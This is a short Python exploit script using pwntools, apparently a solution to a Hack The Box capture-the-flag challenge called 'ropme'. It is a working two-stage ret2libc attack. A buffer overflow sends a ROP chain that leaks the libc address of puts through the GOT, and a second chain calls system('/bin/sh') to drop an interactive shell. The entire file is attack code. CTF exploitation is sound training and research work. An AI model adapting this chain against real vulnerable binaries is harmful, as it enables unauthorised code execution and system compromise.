#!/usr/bin/python
#@Author memN0ps

from pwn import *

log.info("Pwnage by memN0ps!!!")

RHOST = "docker.hackthebox.eu"
RPORT = "43869"

#p = remote(RHOST, RPORT)

#context(terminal=['tmux', 'new-window'])
p = process("./ropme")
#p = gdb.debug('./ropme', 'b main')

context(os="linux", arch="amd64")
#context.log_level="DEBUG"

log.info("Mapping binaries")
ropme = ELF('ropme')
rop = ROP(ropme)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

#1st Stage Payload - Leak

junk = "A" * 72
rop.search(regs=['rdi'], order = 'regs')
rop.puts(ropme.got['puts'])
rop.call(ropme.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())

#raw_input()

payload = junk + str(rop)

p.recvuntil("dah?\n")
p.sendline(payload)

#Leaked address
leaked_puts = p.recvline()[:-1].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBC_2.2.5: " + str(leaked_puts))

leaked_puts = u64(leaked_puts)

#2nd Stage Payload - Shell
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 ROP chain:\n" + rop2.dump())

payload = junk + str(rop2)

#Send payload
p.recvuntil("dah?\n")
p.sendline(payload)

#raw_input()
#Drop an interactive shell
p.interactive()
